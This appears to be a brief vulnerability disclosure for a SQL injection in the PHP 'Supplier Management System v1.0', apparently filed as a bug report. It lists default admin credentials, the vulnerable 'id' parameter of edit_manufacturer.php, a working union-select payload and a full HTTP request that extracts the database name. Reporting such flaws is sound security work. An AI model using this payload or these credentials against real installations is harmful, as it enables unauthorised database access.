# Supplier Management System v1.0 has SQL injection

BUG_AUTHOR: 姚炜柏

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/supplier-management-system-using-php-mysql/

Vulnerability File: /Supply_Management_System/admin/edit_manufacturer.php?id=

Vulnerability location: /Supply_Management_System/admin/edit_manufacturer.php, id

Current database name: sourcecodester_scm_new

[+] Payload: /Supply_Management_System/admin/edit_manufacturer.php?id=-1%27%20union%20select%201,database(),3,4,5,6--+ // Leak place ---> id

```sql
GET /Supply_Management_System/admin/edit_manufacturer.php?id=-1%27%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=a5t02g11mg2iq4r6p3m3ctqa00
Connection: close
```

![image](https://github.com/user-attachments/assets/6cdd4192-0543-41b7-ba08-b5b51ef5d968)
